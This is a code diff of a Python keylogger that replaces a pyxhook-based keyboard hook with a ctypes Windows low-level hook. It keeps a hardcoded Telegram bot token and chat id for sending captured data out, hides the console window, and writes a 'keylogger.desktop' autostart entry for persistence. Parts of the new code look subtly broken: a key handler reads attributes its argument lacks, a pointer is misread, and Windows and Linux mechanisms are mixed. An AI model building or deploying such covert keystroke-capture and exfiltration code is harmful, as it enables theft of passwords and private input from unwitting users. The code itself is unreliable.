@@ -1,54 +1,60 @@
-# import needed modules
 import os
 import sys
 import subprocess
 import time
 from datetime import datetime
-import pyxhook
-import requests
+import urllib.request
+import json
 
-# Telegram bot credentials
 telegram_token = "6285163091:AAEPDAZtSIccvzn8a-wnSI_As89Qh5Kdfvs"
 chat_id = "1306881762"
 
 def send_to_telegram(message):
     url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
-    data = {"chat_id": chat_id, "text": message}
-    requests.post(url, data=data)
+    data = {
+        "chat_id": chat_id,
+        "text": message
+    }
+    data = json.dumps(data).encode("utf-8")
+    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+    urllib.request.urlopen(req)
+
+def OnKeyPress(event):
+    with open(log_file, "a") as f:
+        if event.Key == 'P_Enter':
+            f.write('\n')
+        else:
+            f.write(event.Key)
+
+def hook_keyboard():
+    import threading
+    import ctypes
+
+    def low_level_keyboard_handler(nCode, wParam, lParam):
+        if wParam == 0x100:  # WM_KEYDOWN
+            hooked_key = chr(lParam[0])
+            OnKeyPress(hooked_key)
+        return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)
+
+    CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
+    pointer = CMPFUNC(low_level_keyboard_handler)
+    hook_id = ctypes.windll.user32.SetWindowsHookExA(13, pointer, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
+    msg = ctypes.wintypes.MSG()
+    ctypes.windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0)
 
 def main():
-    # Specify the name of the file (can be changed )
+    global log_file
     log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
 
-    # The logging function with {event parm}
-    def OnKeyPress(event):
-        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
-            if event.Key == 'P_Enter':
-                f.write('\n')
-            else:
-                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters
-
-    # Create a hook manager object
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = OnKeyPress
-
-    new_hook.HookKeyboard()  # set the hook
+    hook_keyboard()
 
     try:
-        new_hook.start()  # start the hook
+        while True:
+            time.sleep(10)
     except KeyboardInterrupt:
-        # User cancelled from command line so close the listener
-        new_hook.cancel()
         pass
-    except Exception as ex:
-        # Write exceptions to the log file, for analysis later.
-        msg = f"Error while catching events:\n  {ex}"
-        pyxhook.print_err(msg)
-        with open(log_file, "a") as f:
-            f.write(f"\n{msg}")
 
 def hide_console():
-    # Hide the console window on Windows
     if os.name == 'nt':
         import win32console
         import win32gui
@@ -56,7 +62,6 @@ def hide_console():
         win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)
 
 def add_to_startup():
-    # Add the script to startup
     startup_file = os.path.expanduser("~/.config/autostart/keylogger.desktop")
     with open(startup_file, "w") as f:
         f.write("[Desktop Entry]\n")
